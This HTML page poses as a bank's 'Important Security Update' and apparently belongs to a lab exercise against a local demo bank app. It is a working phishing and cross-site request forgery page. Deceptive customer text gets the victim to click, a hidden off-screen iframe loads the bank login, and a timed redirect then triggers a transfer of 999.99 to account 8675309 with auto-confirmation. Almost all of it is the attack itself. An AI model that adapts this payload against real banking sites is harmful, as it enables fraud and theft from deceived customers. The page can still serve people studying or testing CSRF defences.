<!DOCTYPE html>
<html>
<head>
    <title>Digital Banking Security Update</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .instructions {
            background-color: #f5f5f5;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .step {
            margin-bottom: 15px;
        }
        .hidden-iframe {
            position: absolute;
            left: -9999px;
            width: 1px;
            height: 1px;
        }
        button {
            padding: 10px 15px;
            background-color: #34495e;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="logo">
        <h1>Digital Bank - Group 14</h1>
    </div>

    <h2>Important Security Update</h2>
    <p>Dear valued customer,</p>
    <p>We're implementing enhanced security measures to protect your account. Please follow the instructions below to verify your account:</p>

    <div class="instructions">
        <div class="step">
            <h3>Step 1: Log in to your account</h3>
            <p>Use your regular username and password to access your account.</p>
            <button id="loginButton">Proceed to Login</button>
        </div>

        <div class="step" id="step2" style="display: none;">
            <h3>Step 2: Verify your account security</h3>
            <p>After logging in, you'll see a verification page. Follow the on-screen instructions to complete the security update.</p>
            <p>This process helps protect your account from unauthorized access.</p>
        </div>
    </div>

    <iframe id="bankFrame" class="hidden-iframe" src=""></iframe>

    <script>
        document.getElementById('loginButton').addEventListener('click', function() {
            // Set up the hidden iframe to load the bank login page
            var bankFrame = document.getElementById('bankFrame');
            bankFrame.src = 'http://127.0.0.1:5000/login';

            // Show step 2 instructions
            document.getElementById('step2').style.display = 'block';

            // Change the button
            this.textContent = 'Waiting for verification...';
            this.disabled = true;

            // For demo purposes, simulate the attack completing after 5 seconds

            setTimeout(function() {
                window.location.href = 'http://127.0.0.1:5000/transfer?to_account=8675309&amount=999.99&description=Security%20Verification&auto_confirm=true';
            }, 5000);
        });
    </script>
</body>
</html>